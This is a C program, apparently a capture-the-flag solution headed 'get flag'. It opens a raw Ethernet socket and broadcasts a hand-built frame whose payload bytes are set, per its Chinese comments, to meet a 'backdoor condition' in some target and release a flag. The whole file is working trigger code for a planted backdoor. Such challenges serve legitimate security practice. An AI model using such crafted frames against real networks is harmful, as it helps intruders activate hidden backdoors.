// get flag
#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define ETH_HDRLEN 14

int main(int argc, char *argv[]) {
    int sockfd;
    struct ifreq if_idx;
    struct ifreq if_mac;
    char if_name[IFNAMSIZ];
    char sendbuf[60];  // 最小以太网帧长度为60字节
    struct ether_header *eh = (struct ether_header *)sendbuf;
    struct sockaddr_ll socket_address;
    int frame_length = 60;  // 发送帧的总长度

    // 检查命令行参数
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    strncpy(if_name, argv[1], IFNAMSIZ - 1);
    if_name[IFNAMSIZ - 1] = '\0';

    // 打开原始套接字
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // 获取接口索引
    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, if_name, IFNAMSIZ - 1);
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
        perror("SIOCGIFINDEX");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // 获取接口的 MAC 地址
    memset(&if_mac, 0, sizeof(struct ifreq));
    strncpy(if_mac.ifr_name, if_name, IFNAMSIZ - 1);
    if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0) {
        perror("SIOCGIFHWADDR");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // 构造以太网头部
    // 目标 MAC 地址：广播地址
    memset(eh->ether_dhost, 0xff, ETH_ALEN);
    // 源 MAC 地址：使用接口的 MAC 地址
    memcpy(eh->ether_shost, if_mac.ifr_hwaddr.sa_data, ETH_ALEN);
    // Ethertype：0x0800（IPv4）
    eh->ether_type = htons(0x0800);

    // 构造负载
    memset(sendbuf + ETH_HDRLEN, 0x00,
           frame_length - ETH_HDRLEN);  // 初始化负载为0

    // 设置特定字节以满足后门条件
    // 注意：索引从0开始，整个帧的字节0-13为以太网头部，14开始为负载

    // 需要设置的字节位置相对于整个帧：
    // data[30] = 0xC0 --> sendbuf[30]
    // data[31] = 0xA8 --> sendbuf[31]
    // data[32] = 123   --> sendbuf[32]
    // data[33] = 1     --> sendbuf[33]
    // data[38] = 82    --> sendbuf[38]
    // data[39] = 0xBF  --> sendbuf[39]
    // data[40] = 1     --> sendbuf[40]

    // 检查帧长度是否足够
    if (frame_length < 41) {
        fprintf(stderr, "Frame length too short. Must be at least 41 bytes.\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // 设置特定字节
    sendbuf[30] = 0xC0;  // data[30]
    sendbuf[31] = 0xA8;  // data[31]
    sendbuf[32] = 123;   // data[32]
    sendbuf[33] = 1;     // data[33]
    sendbuf[38] = 82;    // data[38]
    sendbuf[39] = 0xBF;  // data[39]
    sendbuf[40] = 1;     // data[40]

    // 打印构造的帧内容（可选，用于调试）
    printf("Constructed Ethernet Frame:\n");
    for (int i = 0; i < frame_length; i++) {
        printf("%02x ", (unsigned char)sendbuf[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    // 构造目标地址结构
    memset(&socket_address, 0, sizeof(struct sockaddr_ll));
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    socket_address.sll_halen = ETH_ALEN;
    // 目标 MAC 地址：广播地址
    memset(socket_address.sll_addr, 0xff, ETH_ALEN);

    // 发送帧
    if (sendto(sockfd, sendbuf, frame_length, 0,
               (struct sockaddr *)&socket_address,
               sizeof(struct sockaddr_ll)) < 0) {
        perror("sendto");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Ethernet frame sent successfully.\n");

    close(sockfd);
    return 0;
}
